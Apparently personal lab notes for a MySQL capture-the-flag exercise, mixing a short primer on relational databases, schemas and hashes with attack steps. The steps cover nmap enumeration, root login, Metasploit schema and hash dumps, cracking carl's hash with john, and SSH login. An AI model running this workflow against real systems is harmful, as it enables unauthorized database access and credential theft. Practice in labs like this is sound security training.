MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL).  It is commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack, which includes: Linux, Apache, MySQL, and PHP.

RDBMS:
A software or service used to create and manage databases based on a relational model. The word "relational" just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's "primary key" or other "key" factors.

MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model. But how do the client and server communicate? They use a language, specifically the Structured Query Language (SQL).

1- MySQL creates a database for storing and manipulating data, defining the relationship of each table.
2- Clients make requests by making specific statements in SQL.
3- The server will respond to the client with whatever information has been requested.

Here are some resources that explain the technical implementation, and working of, MySQL in more detail than I have covered here:
https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html 
https://www.w3schools.com/php/php_mysql_intro.asp

https://nmap.org/nsedoc/scripts/mysql-enum.html - nmap sql enum
https://www.exploit-db.com/exploits/23081 - script

sudo nmap -A -p- -Pn 10.10.206.117 -vv
mysql -h 10.10.206.117 -u root -p
set SQL show databases

In MySQL, physically, a schema is synonymous with a database. You can substitute the keyword "SCHEMA" instead of DATABASE in MySQL SQL syntax, for example using CREATE SCHEMA instead of CREATE DATABASE. It's important to understand this relationship because some other database products draw a distinction. For example, in the Oracle Database product, a schema represents only a part of a database: the tables and other objects owned by a single user. 

Hashes are, very simply, the product of a cryptographic algorithm to turn a variable length input into a fixed length output. 
In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data. This creates an index that is significantly smaller than the original data, allowing the values to be searched and accessed more efficiently
Howeer, the data we're going to be extracting are password hashes which are simply a way of storing passwords not in plaintext format.

search mysql_schema
use 0
show options
do all the sets (rhosts, ...)

mysql_schemadump - shows the schema of the database
mysql_hashdump - displays users and hashed passwords

echo carl:*EA031893AA21444B170FC2162A56978B8CEECE18 > ~/Desktop/hash.txt
john hash.txt

ssh carl@10.10.206.117

https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html
https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/

nmap --script=mysql-enum 10.10.206.117
nmap --script=mysql-info 10.10.206.117
nmap --script=mysql-empty-password 10.10.206.117

mysql -h 10.10.206.117 -u root -p - we have the password for "root"
show databases;
use mysql; - change user
show tables; - show the tables in the database
SELECT * FROM user; - we get the user "carl" and his password hash
